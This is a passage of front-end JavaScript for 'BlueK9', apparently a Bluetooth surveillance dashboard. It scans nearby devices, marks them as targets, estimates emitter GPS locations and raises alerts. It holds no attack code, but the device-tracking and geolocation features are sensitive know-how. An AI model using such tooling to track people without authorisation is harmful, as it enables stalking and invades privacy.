        if (info.capabilities.edr) html += `<span class="cap-badge cap-edr">EDR</span>`;
        if (info.capabilities.ble) html += `<span class="cap-badge cap-ble">BLE</span>`;
        if (info.capabilities.secure_pairing) html += `<span class="cap-badge cap-secure">Secure Pairing</span>`;
        if (info.capabilities.afh) html += `<span class="cap-badge cap-afh">AFH</span>`;
        if (info.capabilities.total_features) {
            html += `<span class="cap-badge cap-count">${info.capabilities.total_features} Features</span>`;
        }
        html += `</div>`;
    }

    // Show feature list if available
    if (info.features && info.features.length > 0) {
        html += `<div class="info-section-header" style="margin-top: 15px;">SUPPORTED FEATURES</div>`;
        html += `<div class="features-list">`;
        info.features.forEach(feature => {
            html += `<span class="feature-tag">${feature}</span>`;
        });
        html += `</div>`;
    }

    // Show raw output at the bottom (collapsed by default)
    if (info.raw_info && info.raw_info.trim()) {
        html += `
            <div class="info-section-header" style="margin-top: 15px;">
                <span onclick="toggleRawOutput()" style="cursor: pointer;">RAW OUTPUT <span id="rawToggle">[+]</span></span>
            </div>
            <pre class="hcitool-output" id="rawOutputPre" style="display: none;">${info.raw_info}</pre>
        `;
    } else {
        html += `
            <div class="info-section-header" style="margin-top: 15px;">RAW OUTPUT</div>
            <pre class="hcitool-output hcitool-empty">No response from device.
Device may be out of range or not responding.</pre>
        `;
    }

    html += '</div>';
    content.innerHTML = html;

    addLogEntry(`Device info loaded for ${info.bd_address}`, 'INFO');
}

function toggleRawOutput() {
    const pre = document.getElementById('rawOutputPre');
    const toggle = document.getElementById('rawToggle');
    if (pre.style.display === 'none') {
        pre.style.display = 'block';
        toggle.textContent = '[-]';
    } else {
        pre.style.display = 'none';
        toggle.textContent = '[+]';
    }
}

function correctDeviceType(selectEl) {
    const bdAddress = selectEl.dataset.bd;
    const newType = selectEl.value;

    fetch(`/api/device/${encodeURIComponent(bdAddress)}/type`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ device_type: newType })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'updated') {
            addLogEntry(`Device type corrected: ${bdAddress} → ${newType.toUpperCase()}`, 'INFO');
            // Update local device cache
            if (devices[bdAddress]) {
                devices[bdAddress].device_type = newType;
            }
            // Refresh survey table to reflect change
            updateSurveyTable();
        } else if (data.error) {
            addLogEntry(`Failed to correct device type: ${data.error}`, 'ERROR');
        }
    })
    .catch(e => {
        addLogEntry(`Error correcting device type: ${e}`, 'ERROR');
    });
}

function closeDeviceInfoModal() {
    document.getElementById('deviceInfoModal').classList.add('hidden');
}

// ==================== ALERTS ====================

// Store current alert data for copy function
let currentAlertData = null;

function showTargetAlert(data) {
    const device = data.device || data;
    const location = data.location || currentLocation;
    const systemId = data.system_id || 'Unknown';
    const systemName = data.system_name || 'BlueK9';

    // Play alert sound
    const audio = document.getElementById('alertSound');
    audio.currentTime = 0;
    audio.play().catch(e => console.log('Audio play failed:', e));

    // Update modal content
    document.getElementById('alertBdAddress').textContent = device.bd_address;
    document.getElementById('alertDeviceName').textContent = device.device_name || 'Unknown Device';

    let details = '';
    details += `System: ${systemId} (${systemName})\n`;
    details += `Time: ${formatDateTimeInTimezone(new Date())}\n`;
    if (device.first_seen) details += `First Seen: ${formatDateTimeInTimezone(device.first_seen)}\n`;
    if (device.last_seen) details += `Last Seen: ${formatDateTimeInTimezone(device.last_seen)}\n`;
    if (device.rssi) details += `RSSI: ${device.rssi} dBm\n`;
    if (device.tx_power) details += `TX Power: ${device.tx_power} dBm\n`;
    if (device.device_type) details += `Type: ${device.device_type === 'ble' ? 'BLE' : device.device_type === 'classic' ? 'Classic' : device.device_type}\n`;
    if (device.addr_type) details += `Address Type: ${device.addr_type}\n`;
    if (device.manufacturer) details += `OUI Manufacturer: ${device.manufacturer}\n`;
    if (device.bt_company) details += `BT Company: ${device.bt_company}\n`;
    if (device.emitter_lat && device.emitter_lon) {
        details += `Emitter Est: ${device.emitter_lat.toFixed(6)}, ${device.emitter_lon.toFixed(6)}\n`;
        if (device.emitter_accuracy) details += `CEP: ${device.emitter_accuracy.toFixed(1)}m\n`;
    }

    document.getElementById('alertDetails').textContent = details;

    // System location
    const sysLocSpan = document.getElementById('alertSystemLocation');
    const mapLink = document.getElementById('alertMapLink');
    if (location && location.lat && location.lon) {
        sysLocSpan.textContent = `${location.lat.toFixed(6)}, ${location.lon.toFixed(6)}`;
        mapLink.href = `https://maps.google.com/?q=${location.lat.toFixed(6)},${location.lon.toFixed(6)}`;
        mapLink.style.display = 'inline';
    } else {
        sysLocSpan.textContent = 'No GPS Fix';
        mapLink.style.display = 'none';
    }

    // Store for copy
    currentAlertData = {
        device: device,
        location: location,
        systemId: systemId,
        systemName: systemName,
        timestamp: new Date().toISOString()
    };

    // Show modal
    document.getElementById('targetAlertModal').classList.remove('hidden');
}

function copyAlertDetails() {
    if (!currentAlertData) {
        addLogEntry('No alert data to copy', 'WARNING');
        return;
    }

    const d = currentAlertData.device;
    const loc = currentAlertData.location;

    let text = `=== TARGET ALERT ===\n`;
    text += `System: ${currentAlertData.systemId} (${currentAlertData.systemName})\n`;
    text += `Time: ${currentAlertData.timestamp}\n`;
    text += `\n--- Device ---\n`;
    text += `BD Address: ${d.bd_address}\n`;
    text += `Name: ${d.device_name || 'Unknown'}\n`;
    if (d.rssi) text += `RSSI: ${d.rssi} dBm\n`;
    if (d.tx_power) text += `TX Power: ${d.tx_power} dBm\n`;
    if (d.device_type) text += `Type: ${d.device_type === 'ble' ? 'BLE' : d.device_type === 'classic' ? 'Classic' : d.device_type}\n`;
    if (d.addr_type) text += `Address Type: ${d.addr_type}\n`;
    if (d.manufacturer) text += `OUI Manufacturer: ${d.manufacturer}\n`;
    if (d.bt_company) text += `BT Company: ${d.bt_company}\n`;
    if (d.first_seen) text += `First Seen: ${formatDateTimeInTimezone(d.first_seen)}\n`;
    if (d.last_seen) text += `Last Seen: ${formatDateTimeInTimezone(d.last_seen)}\n`;

    if (loc && loc.lat) {
        text += `\n--- System Location ---\n`;
        text += `Lat: ${loc.lat.toFixed(6)}\n`;
        text += `Lon: ${loc.lon.toFixed(6)}\n`;
        text += `Google Maps: https://maps.google.com/?q=${loc.lat.toFixed(6)},${loc.lon.toFixed(6)}\n`;
    }

    if (d.emitter_lat && d.emitter_lon) {
        text += `\n--- Estimated Emitter Location ---\n`;
        text += `Lat: ${d.emitter_lat.toFixed(6)}\n`;
        text += `Lon: ${d.emitter_lon.toFixed(6)}\n`;
        if (d.emitter_accuracy) text += `CEP: ${d.emitter_accuracy.toFixed(1)}m\n`;
        text += `Google Maps: https://maps.google.com/?q=${d.emitter_lat.toFixed(6)},${d.emitter_lon.toFixed(6)}\n`;
    }

    // Try clipboard API first, fallback to textarea method
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
            addLogEntry('Alert details copied to clipboard', 'INFO');
        }).catch(err => {
            // Fallback
            copyTextFallback(text);
        });
    } else {
        copyTextFallback(text);
    }
}

function copyTextFallback(text) {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.style.position = 'fixed';
    textarea.style.left = '-9999px';
    document.body.appendChild(textarea);
    textarea.select();
    try {
        document.execCommand('copy');
        addLogEntry('Alert details copied to clipboard', 'INFO');
    } catch (err) {
        addLogEntry('Failed to copy: ' + err, 'ERROR');
    }
    document.body.removeChild(textarea);
}

function closeAlertModal() {
    document.getElementById('targetAlertModal').classList.add('hidden');
    const audio = document.getElementById('alertSound');
    audio.pause();
    currentAlertData = null;
}

// ==================== LOGS ====================

function loadLogs() {
    fetch('/api/logs')
        .then(response => response.json())
        .then(data => {
            data.forEach(entry => {
                addLogEntry(entry.message, entry.level, false);
            });
        });
}

function addLogEntry(message, level = 'INFO', scroll = true) {
    const container = document.getElementById('logContainer');
    const entry = document.createElement('div');
    entry.className = 'log-entry';

    const time = formatTimeInTimezone(new Date());
    entry.innerHTML = `
        <span class="log-time">${time}</span>
        <span class="log-level ${level}">${level}</span>
        <span class="log-message">${message}</span>
    `;

    container.appendChild(entry);

    // Limit log entries
    while (container.children.length > 200) {
        container.removeChild(container.firstChild);
    }

    // Scroll to bottom
    if (scroll) {
        container.scrollTop = container.scrollHeight;
    }
}

// ==================== UTILITIES ====================

function updateTime() {
    const now = new Date();
    const options = {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false,
        timeZone: currentTimezone
    };
    try {
        document.getElementById('sysTime').textContent = now.toLocaleTimeString('en-US', options);
    } catch (e) {
        // Fallback if timezone is invalid
        document.getElementById('sysTime').textContent = now.toLocaleTimeString();
    }
}

/**
 * Load timezone setting on startup
 */
function loadTimezone() {
    fetch('/api/settings')
        .then(r => r.json())
        .then(data => {
            if (data.timezone) {
                currentTimezone = data.timezone;
                updateTime(); // Immediately update display with correct timezone
            }
        })
        .catch(e => {
            console.log('Could not load timezone setting:', e);
        });
}

function formatTimeInTimezone(date) {
    if (!date) return '--';
    const options = {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false,
        timeZone: currentTimezone
    };
    try {
        return new Date(date).toLocaleTimeString('en-US', options);
    } catch (e) {
        return new Date(date).toLocaleTimeString();
    }
}

function formatDateTimeInTimezone(date) {
    if (!date) return '--';
    const options = {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false,
        timeZone: currentTimezone
    };
    try {
        return new Date(date).toLocaleString('en-US', options);
    } catch (e) {
        return new Date(date).toLocaleString();
    }
}

// ==================== HARDWARE MONITORING ====================

function fetchSystemStats() {
    fetch('/api/system/stats')
        .then(r => r.json())
        .then(stats => {
            updateHardwareDisplay(stats);
        })
        .catch(e => {
            // Silent fail - hardware stats are non-critical
        });
}

function updateHardwareDisplay(stats) {
    // CPU Usage
    const cpuEl = document.getElementById('cpuUsage');
    if (cpuEl && stats.cpu_percent !== null) {
        cpuEl.textContent = `${stats.cpu_percent}%`;
        cpuEl.classList.remove('warning', 'danger');
        if (stats.cpu_percent > 80) {
            cpuEl.classList.add('danger');
        } else if (stats.cpu_percent > 60) {
            cpuEl.classList.add('warning');
        }
    }

    // CPU Temperature
    const tempEl = document.getElementById('cpuTemp');
    if (tempEl && stats.cpu_temp !== null) {
        tempEl.textContent = `${stats.cpu_temp}°C`;
        tempEl.classList.remove('warning', 'danger');
        if (stats.cpu_temp > 70) {
            tempEl.classList.add('danger');
        } else if (stats.cpu_temp > 55) {
            tempEl.classList.add('warning');
        }
    } else if (tempEl) {
        tempEl.textContent = '--°C';
    }

    // Memory Usage
    const memEl = document.getElementById('memUsage');
    if (memEl && stats.memory_percent !== null) {
        memEl.textContent = `${stats.memory_percent}%`;
        memEl.classList.remove('warning', 'danger');
        if (stats.memory_percent > 85) {
            memEl.classList.add('danger');
        } else if (stats.memory_percent > 70) {
            memEl.classList.add('warning');
        }
    }
}

function truncate(str, length) {
    if (!str) return '';
    return str.length > length ? str.substring(0, length) + '...' : str;
}

// Export for logs download
function exportLogs() {
    fetch('/api/logs/export')
        .then(response => response.json())
        .then(data => {
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `bluek9_logs_${new Date().toISOString().slice(0, 10)}.json`;
            a.click();
            URL.revokeObjectURL(url);
        });
}

// Keyboard shortcuts
document.addEventListener('keydown', (e) => {
    // Escape to close modals
    if (e.key === 'Escape') {
        closeAlertModal();
        closeDeviceInfoModal();
        hideContextMenu();
    }

    // Ctrl+S to start/stop scan
    if (e.ctrlKey && e.key === 's') {
        e.preventDefault();
        if (scanning) {
            stopScan();
        } else {
            startScan();
        }
    }
});

// ==================== CONTEXT MENU ====================

function createContextMenu() {
    // Remove existing menu if any
    const existing = document.getElementById('deviceContextMenu');
    if (existing) existing.remove();

    const menu = document.createElement('div');
    menu.id = 'deviceContextMenu';
    menu.className = 'context-menu hidden';
    menu.innerHTML = `
        <div class="context-menu-item" onclick="contextMenuAction('info')">
            <i>ℹ</i> Get Device Info
        </div>
        <div class="context-menu-item" onclick="contextMenuAction('name')">
            <i>📝</i> Get Device Name
        </div>
        <div class="context-menu-item" onclick="contextMenuAction('locate')">
            <i>📍</i> Geolocate Device
        </div>
        <div class="context-menu-item" onclick="contextMenuAction('georeset')">
            <i>🔄</i> Reset Device Geo
        </div>
        <div class="context-menu-divider"></div>
        <div class="context-menu-item" onclick="contextMenuAction('target')">
            <i>🎯</i> Add as Target
        </div>
        <div class="context-menu-item" onclick="contextMenuAction('copy')">
            <i>📋</i> Copy BD Address
        </div>
        <div class="context-menu-divider"></div>
        <div class="context-menu-item" onclick="contextMenuAction('zoom')">
            <i>🗺</i> Zoom to Location
        </div>
    `;
    document.body.appendChild(menu);
    return menu;
}

function showContextMenu(e, bdAddress) {
    e.preventDefault();
    contextMenuTarget = bdAddress;

    let menu = document.getElementById('deviceContextMenu');
    if (!menu) {
        menu = createContextMenu();
    }

    // Update menu items based on device state
    const device = devices[bdAddress];
    const targetItem = menu.querySelector('[onclick*="target"]');
    if (device && device.is_target) {
        targetItem.innerHTML = '<i>🎯</i> Remove from Targets';
    } else {
        targetItem.innerHTML = '<i>🎯</i> Add as Target';
    }

    // Update name option based on whether name retrieval is running
    const nameItem = menu.querySelector('[onclick*="name"]');
    if (nameItem) {
        if (nameRetrievalActive[bdAddress]) {
            nameItem.innerHTML = '<i>⏹</i> Stop Get Name';
            nameItem.classList.add('active-op');
        } else {
            nameItem.innerHTML = '<i>📝</i> Get Device Name';
            nameItem.classList.remove('active-op');
        }
    }

    // Update locate option based on device type
    const locateItem = menu.querySelector('[onclick*="locate"]');
    if (locateItem) {
        if (device && device.device_type === 'ble') {
            locateItem.innerHTML = '<i>📍</i> Geolocate (RSSI only)';
            locateItem.title = 'BLE devices use RSSI-based tracking only';
        } else {
            locateItem.innerHTML = '<i>📍</i> Geolocate Device';
            locateItem.title = '';
        }
    }

    // Update info option based on device type
    const infoItem = menu.querySelector('[onclick*="info"]');
    if (infoItem) {
        if (device && device.device_type === 'ble') {
            infoItem.innerHTML = '<i>ℹ</i> Get Device Info (limited)';
            infoItem.title = 'hcitool info has limited results for BLE devices';
        } else {
            infoItem.innerHTML = '<i>ℹ</i> Get Device Info';
            infoItem.title = '';
        }
    }

    // Position the menu with smart repositioning
    positionContextMenu(menu, e.clientX, e.clientY);
}

/**
 * Position context menu to stay within viewport bounds
 */
function positionContextMenu(menu, x, y) {
    // Reset position to calculate natural size
    menu.style.left = '0';
    menu.style.top = '0';
    menu.classList.remove('hidden');

    const rect = menu.getBoundingClientRect();
    const viewportWidth = window.innerWidth;
    const viewportHeight = window.innerHeight;
    const padding = 10; // Padding from edges

    // Calculate best position
    let finalX = x;
    let finalY = y;

    // Horizontal positioning
    if (x + rect.width + padding > viewportWidth) {
        // Menu would overflow right - position to left of cursor
        finalX = Math.max(padding, x - rect.width);
    }

    // Vertical positioning
    if (y + rect.height + padding > viewportHeight) {
        // Menu would overflow bottom
        if (rect.height > viewportHeight - 2 * padding) {
            // Menu is taller than viewport - position at top with scroll
            finalY = padding;
        } else {
            // Position above cursor
            finalY = Math.max(padding, y - rect.height);
        }
    }

    menu.style.left = finalX + 'px';
    menu.style.top = finalY + 'px';
}

function hideContextMenu() {
    const menu = document.getElementById('deviceContextMenu');
    if (menu) {
        menu.classList.add('hidden');
    }
    contextMenuTarget = null;
}

function contextMenuAction(action) {
    if (!contextMenuTarget) return;

    const bdAddress = contextMenuTarget;
    const device = devices[bdAddress];

    switch (action) {
        case 'info':
            getDeviceInfo(bdAddress);
            break;
        case 'name':
            requestDeviceName(bdAddress);
            break;
        case 'locate':
            requestGeolocation(bdAddress);
            break;
        case 'georeset':
            resetDeviceGeo(bdAddress);
            break;
        case 'target':
            if (device && device.is_target) {
                removeTarget(bdAddress);
            } else {
                quickAddTarget(bdAddress);
            }
            break;
        case 'copy':
            navigator.clipboard.writeText(bdAddress).then(() => {
                addLogEntry(`Copied ${bdAddress} to clipboard`, 'INFO');
            });
            break;
        case 'zoom':
            if (device && device.emitter_lat && device.emitter_lon) {
                map.flyTo({
                    center: [device.emitter_lon, device.emitter_lat],
                    zoom: 18
                });
            } else {
                addLogEntry('No location data for this device', 'WARNING');
            }
            break;
    }

    hideContextMenu();
}

function requestDeviceName(bdAddress) {
    // Start continuous name retrieval
    if (nameRetrievalActive[bdAddress]) {
        // Stop if already running
        stopNameRetrieval(bdAddress);
    } else {
        startNameRetrieval(bdAddress);
    }
}

function startNameRetrieval(bdAddress) {
    addLogEntry(`Starting continuous name query for ${bdAddress}...`, 'INFO');
    nameRetrievalActive[bdAddress] = true;

    fetch(`/api/device/${bdAddress}/name/start`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.status === 'started') {
                addLogEntry(`Name retrieval started for ${bdAddress}`, 'INFO');
                // Track in operations bar
                addOperation(`name-${bdAddress}`, 'NAME', 'Name Query', {
                    bdAddress,
                    cancellable: true,
                    cancelFn: () => stopNameRetrieval(bdAddress)
                });
            } else if (data.status === 'already_running') {
                addLogEntry(`Name retrieval already running for ${bdAddress}`, 'WARNING');
            }
        })
        .catch(e => {
            addLogEntry(`Failed to start name retrieval: ${e}`, 'ERROR');
            nameRetrievalActive[bdAddress] = false;
        });
}

function stopNameRetrieval(bdAddress) {
    addLogEntry(`Stopping name query for ${bdAddress}...`, 'INFO');

    fetch(`/api/device/${bdAddress}/name/stop`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            nameRetrievalActive[bdAddress] = false;
            addLogEntry(`Name retrieval stopped for ${bdAddress}`, 'INFO');
            // Remove from operations bar
            removeOperation(`name-${bdAddress}`);
        })
        .catch(e => {
            addLogEntry(`Failed to stop name retrieval: ${e}`, 'ERROR');
        });
}

function requestGeolocation(bdAddress) {
    addLogEntry(`Requesting geolocation for ${bdAddress}...`, 'INFO');
    fetch(`/api/device/${bdAddress}/locate`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.location) {
                addLogEntry(`Location: ${data.location.lat.toFixed(6)}, ${data.location.lon.toFixed(6)} (CEP: ${data.location.cep}m)`, 'INFO');
                if (devices[bdAddress]) {
                    devices[bdAddress].emitter_lat = data.location.lat;
                    devices[bdAddress].emitter_lon = data.location.lon;
                    devices[bdAddress].emitter_accuracy = data.location.cep;
                    updateDeviceMarker(devices[bdAddress]);
                    updateSurveyTable();
                }
            } else {
                addLogEntry(data.message || 'Insufficient data for geolocation', 'WARNING');
            }
        })
        .catch(e => addLogEntry(`Geolocation failed: ${e}`, 'ERROR'));
}

// Click anywhere to close context menus
document.addEventListener('click', (e) => {
    if (!e.target.closest('.context-menu')) {
        hideContextMenu();
        hideTargetContextMenu();
    }
});

// ==================== SETTINGS MODAL ====================

function openSettingsModal() {
    loadSettings();
    loadUsers();
    loadSmsNumbers();
    loadRadios();
    loadSystemInfo();
    loadUbertoothStatus();
    document.getElementById('settingsModal').classList.remove('hidden');
}

/**
 * Open settings modal to a specific tab
 */
function openSettings(tabName) {
    openSettingsModal();

    if (tabName) {
        // Switch to the specified tab
        const tabId = 'settings' + tabName.charAt(0).toUpperCase() + tabName.slice(1);
        const tabEl = document.getElementById(tabId);

        if (tabEl) {
            // Hide all tabs
            document.querySelectorAll('.settings-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.settings-tab').forEach(el => el.classList.remove('active'));

            // Show selected tab
            tabEl.classList.add('active');

            // Find and activate the corresponding tab button
            document.querySelectorAll('.settings-tab').forEach(btn => {
                if (btn.textContent.toLowerCase().includes(tabName.toLowerCase())) {
                    btn.classList.add('active');
                }
            });

            // If opening network tab, refresh network data
            if (tabName === 'network') {
                refreshSettingsNetworkTab();
            }
        }
    }
}

function closeSettingsModal() {
    document.getElementById('settingsModal').classList.add('hidden');
}

function showSettingsTab(tabName) {
    // Hide all tabs
    document.querySelectorAll('.settings-content').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.settings-tab').forEach(el => el.classList.remove('active'));

    // Show selected tab
    document.getElementById('settings' + tabName.charAt(0).toUpperCase() + tabName.slice(1)).classList.add('active');
    event.target.classList.add('active');

    // If opening network tab, refresh network data
    if (tabName.toLowerCase() === 'network') {
        refreshSettingsNetworkTab();
    }
}

function updateGpsSettingsFields() {
    const source = document.getElementById('settingGpsSource').value;
    document.getElementById('gpsNmeaSettings').classList.toggle('hidden', source !== 'nmea_tcp');
    document.getElementById('gpsGpsdSettings').classList.toggle('hidden', source !== 'gpsd');
    document.getElementById('gpsSerialSettings').classList.toggle('hidden', source !== 'serial');
}

function loadSettings() {
    fetch('/api/settings')
        .then(r => r.json())
        .then(data => {
            // General settings
            document.getElementById('settingSystemId').value = data.system_id || 'BK9-001';
            document.getElementById('settingSystemName').value = data.system_name || 'BlueK9 Unit 1';

            // Update version footer with system ID
            const footerIdEl = document.getElementById('systemIdFooter');
            if (footerIdEl) {
                footerIdEl.textContent = data.system_id || 'BK9-001';
            }
            document.getElementById('settingScanInterval').value = data.scan_interval || 2;
            document.getElementById('settingSmsInterval').value = data.sms_alert_interval || 60;

            // Display settings
            document.getElementById('settingTimezone').value = data.timezone || 'UTC';
            currentTimezone = data.timezone || 'UTC';

            // GPS settings
            document.getElementById('settingGpsSource').value = data.gps_source || 'nmea_tcp';
            document.getElementById('settingNmeaHost').value = data.nmea_tcp_host || '127.0.0.1';
            document.getElementById('settingNmeaPort').value = data.nmea_tcp_port || 10110;
            document.getElementById('settingGpsdHost').value = data.gpsd_host || '127.0.0.1';
            document.getElementById('settingGpsdPort').value = data.gpsd_port || 2947;
            document.getElementById('settingSerialPort').value = data.gps_serial_port || '/dev/ttyUSB0';
            document.getElementById('settingSerialBaud').value = data.gps_serial_baud || 9600;

            updateGpsSettingsFields();

            // UI settings
            document.getElementById('settingLeftPanelWidth').value = data.left_panel_width || 280;
            document.getElementById('settingRightPanelWidth').value = data.right_panel_width || 420;
        })
        .catch(e => addLogEntry(`Failed to load settings: ${e}`, 'ERROR'));
}

function saveAllSettings() {
    const settings = {
        system_id: document.getElementById('settingSystemId').value,
        system_name: document.getElementById('settingSystemName').value,
        scan_interval: parseInt(document.getElementById('settingScanInterval').value),
        sms_alert_interval: parseInt(document.getElementById('settingSmsInterval').value),
        timezone: document.getElementById('settingTimezone').value,
        gps_source: document.getElementById('settingGpsSource').value,
        nmea_tcp_host: document.getElementById('settingNmeaHost').value,
        nmea_tcp_port: parseInt(document.getElementById('settingNmeaPort').value),
        gpsd_host: document.getElementById('settingGpsdHost').value,
        gpsd_port: parseInt(document.getElementById('settingGpsdPort').value),
        gps_serial_port: document.getElementById('settingSerialPort').value,
        gps_serial_baud: parseInt(document.getElementById('settingSerialBaud').value),
        left_panel_width: parseInt(document.getElementById('settingLeftPanelWidth').value),
        right_panel_width: parseInt(document.getElementById('settingRightPanelWidth').value)
    };

    // Update global timezone
    currentTimezone = settings.timezone;

    fetch('/api/settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(settings)
    })
        .then(r => r.json())
        .then(data => {
            if (data.status === 'saved') {
                addLogEntry('Settings saved successfully', 'INFO');
                applyLayoutSettings(settings);
                // Update version footer with new system ID
                const footerIdEl = document.getElementById('systemIdFooter');
                if (footerIdEl && settings.system_id) {
                    footerIdEl.textContent = settings.system_id;
                }
                closeSettingsModal();
            } else {
                addLogEntry('Failed to save settings', 'ERROR');
            }
        })
        .catch(e => addLogEntry(`Save settings error: ${e}`, 'ERROR'));
}

function applyLayoutSettings(settings) {
    const leftPanel = document.querySelector('.panel-left');
    const rightPanel = document.querySelector('.panel-right');

    if (leftPanel && settings.left_panel_width) {
        leftPanel.style.width = settings.left_panel_width + 'px';
    }
    if (rightPanel && settings.right_panel_width) {
        rightPanel.style.width = settings.right_panel_width + 'px';
    }
}

function testGpsSettings() {
    const source = document.getElementById('settingGpsSource').value;
    let config = { source: source };

    if (source === 'nmea_tcp') {
        config.host = document.getElementById('settingNmeaHost').value;
        config.port = parseInt(document.getElementById('settingNmeaPort').value);
    } else if (source === 'gpsd') {
        config.host = document.getElementById('settingGpsdHost').value;
        config.port = parseInt(document.getElementById('settingGpsdPort').value);
    } else if (source === 'serial') {
        config.port = document.getElementById('settingSerialPort').value;
        config.baud = parseInt(document.getElementById('settingSerialBaud').value);
    }

    addLogEntry('Testing GPS connection...', 'INFO');
    fetch('/api/gps/test', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(config)
    })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                addLogEntry(`GPS test successful: ${data.lat}, ${data.lon}`, 'INFO');
            } else {
                addLogEntry(`GPS test failed: ${data.error}`, 'ERROR');
            }
        })
        .catch(e => addLogEntry(`GPS test error: ${e}`, 'ERROR'));
}

// ==================== USER MANAGEMENT ====================

function loadUsers() {
    fetch('/api/users')
        .then(r => r.json())
        .then(data => {
            const userList = document.getElementById('userList');
            userList.innerHTML = '';

            data.forEach(user => {
                const item = document.createElement('div');
                item.className = 'user-item';
                // Only admins can delete, and can't delete bluek9 or themselves
                const canDelete = typeof IS_ADMIN !== 'undefined' && IS_ADMIN &&
                                  user.username !== 'bluek9' &&
                                  user.username !== (typeof CURRENT_USER !== 'undefined' ? CURRENT_USER : '');
                item.innerHTML = `
                    <div>
                        <span class="user-name">${user.username}</span>
                        <span class="user-role">${user.is_admin ? '[ADMIN]' : '[USER]'}</span>
                    </div>
                    <div class="user-actions">
                        ${canDelete ? `<button onclick="deleteUser('${user.username}')">Delete</button>` : ''}
                    </div>
                `;
                userList.appendChild(item);
            });
        })
        .catch(e => addLogEntry(`Failed to load users: ${e}`, 'ERROR'));
}

function createUser() {
    const username = document.getElementById('newUsername').value;
    const password = document.getElementById('newPassword').value;
    const isAdmin = document.getElementById('newUserAdmin').checked;

    if (!username || !password) {
        addLogEntry('Username and password are required', 'ERROR');
        return;
    }

    fetch('/api/users', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password, is_admin: isAdmin })
    })
        .then(r => r.json())
        .then(data => {
            if (data.status === 'created') {
                addLogEntry(`User ${username} created`, 'INFO');
                document.getElementById('newUsername').value = '';
                document.getElementById('newPassword').value = '';
                document.getElementById('newUserAdmin').checked = false;
                loadUsers();
            } else {
                addLogEntry(data.error || 'Failed to create user', 'ERROR');
            }
        })
        .catch(e => addLogEntry(`Create user error: ${e}`, 'ERROR'));
}

function deleteUser(username) {
    if (!confirm(`Delete user ${username}?`)) return;

    fetch(`/api/users/${username}`, { method: 'DELETE' })
        .then(r => r.json())
        .then(data => {
            if (data.status === 'deleted') {
                addLogEntry(`User ${username} deleted`, 'INFO');
                loadUsers();
            } else {
                addLogEntry(data.error || 'Failed to delete user', 'ERROR');
            }
        })
        .catch(e => addLogEntry(`Delete user error: ${e}`, 'ERROR'));
}

function changePassword() {
    const current = document.getElementById('currentPassword').value;
    const newPass = document.getElementById('newPasswordChange').value;
    const confirm = document.getElementById('confirmPassword').value;

    if (newPass !== confirm) {
        addLogEntry('New passwords do not match', 'ERROR');
        return;
    }

    fetch('/api/users/password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ current_password: current, new_password: newPass })
    })
        .then(r => r.json())
        .then(data => {
            if (data.status === 'changed') {
                addLogEntry('Password changed successfully', 'INFO');
                document.getElementById('currentPassword').value = '';
                document.getElementById('newPasswordChange').value = '';
                document.getElementById('confirmPassword').value = '';
            } else {
                addLogEntry(data.error || 'Failed to change password', 'ERROR');
            }
        })
        .catch(e => addLogEntry(`Change password error: ${e}`, 'ERROR'));
}

// ==================== SOFTWARE UPDATES ====================

function checkForUpdates() {
    const statusPanel = document.getElementById('updateStatusPanel');
    const statusIcon = document.getElementById('updateStatusIcon');
    const statusText = document.getElementById('updateStatusText');
    const details = document.getElementById('updateDetails');
    const changesSection = document.getElementById('updateChangesSection');
    const changesList = document.getElementById('updateChangesList');
    const actions = document.getElementById('updateActions');
    const checkBtn = document.getElementById('btnCheckUpdates');

    // Show status panel and indicate checking
    statusPanel.classList.remove('hidden');
    statusIcon.innerHTML = '&#8987;'; // Hourglass
    statusIcon.className = 'update-status-icon checking';
    statusText.textContent = 'SCANNING FOR UPDATES...';
    details.innerHTML = '<div class="update-progress"><div class="update-progress-bar"></div></div>';
    changesSection.classList.add('hidden');
    actions.classList.add('hidden');
    checkBtn.disabled = true;

    fetch('/api/updates/check')
        .then(r => r.json())
        .then(data => {
            checkBtn.disabled = false;

            if (data.error) {
                statusIcon.innerHTML = '&#9888;'; // Warning
                statusIcon.className = 'update-status-icon error';
                statusText.textContent = 'UPDATE CHECK FAILED';
                details.innerHTML = `<div class="update-error">${data.error}</div>`;
                return;
            }

            // Update system info
            if (data.current_commit) {
                document.getElementById('sysInfoCommit').textContent = data.current_commit.substring(0, 8);
            }
            if (data.current_branch) {
                document.getElementById('sysInfoBranch').textContent = data.current_branch;
            }

            if (data.update_available) {
                // Update available - show tech UI
                statusIcon.innerHTML = '&#128229;'; // Inbox arrow
                statusIcon.className = 'update-status-icon update-available';
                statusText.textContent = 'UPDATE AVAILABLE';

                let detailsHtml = `
                    <div class="update-info-grid">
                        <div class="update-info-item">
                            <span class="update-label">CURRENT:</span>
                            <span class="update-value commit">${data.current_commit ? data.current_commit.substring(0, 8) : '--'}</span>
                        </div>
                        <div class="update-info-item">
                            <span class="update-label">LATEST:</span>
                            <span class="update-value commit new">${data.remote_commit ? data.remote_commit.substring(0, 8) : '--'}</span>
                        </div>
                        <div class="update-info-item">
                            <span class="update-label">BEHIND:</span>
                            <span class="update-value">${data.commits_behind || 0} commit(s)</span>
                        </div>
                    </div>
                `;
                details.innerHTML = detailsHtml;

